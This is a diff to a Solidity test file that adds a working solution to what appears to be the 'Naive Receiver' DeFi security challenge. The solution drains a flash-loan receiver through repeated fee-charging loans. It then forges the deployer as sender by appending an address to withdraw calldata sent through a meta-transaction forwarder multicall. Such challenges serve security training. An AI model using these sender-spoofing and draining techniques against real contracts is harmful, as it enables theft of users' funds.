@@ -77,7 +77,55 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory multicall_array = new bytes[](11);
+
+        // Calldata for flashLoan on behalf of FlashLoanReceiver: 10 times
+        // Every time 1 WETH will be emptied from FlashLoanReceiver as fee
+        // and deposited under feeReceiver's account, i.e. deployer's account
+        bytes memory flash_loan = abi.encodeWithSignature(
+            "flashLoan(address,address,uint256,bytes)",
+            receiver,
+            weth,
+            0,  // amount for loan
+            bytes("")
+        );
+        for (uint256 i = 0; i < 10; ) {
+            multicall_array[i] = flash_loan;
+            unchecked {
+                ++i;
+            }
+        }
+
+        // Calldata for withdrawing on behalf of the feeReceiver, i.e. deployer
+        bytes memory withdraw = abi.encodeWithSignature(
+            "withdraw(uint256,address)",
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            uint256(uint160(recovery)),
+            uint256(uint160(deployer))
+        );
+        multicall_array[10] = withdraw;
+
+        bytes memory request_data = abi.encodeWithSignature("multicall(bytes[])", multicall_array);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,         // from
+            address(pool),  // target
+            0,      // value
+            3_000_000,      // gas
+            0,      // nonce
+            request_data,   // data
+            block.timestamp + 10    // deadline
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        ));
+        bytes memory signature = abi.encodePacked(r, s, v);
+        forwarder.execute(request, signature);
     }
 
     /**
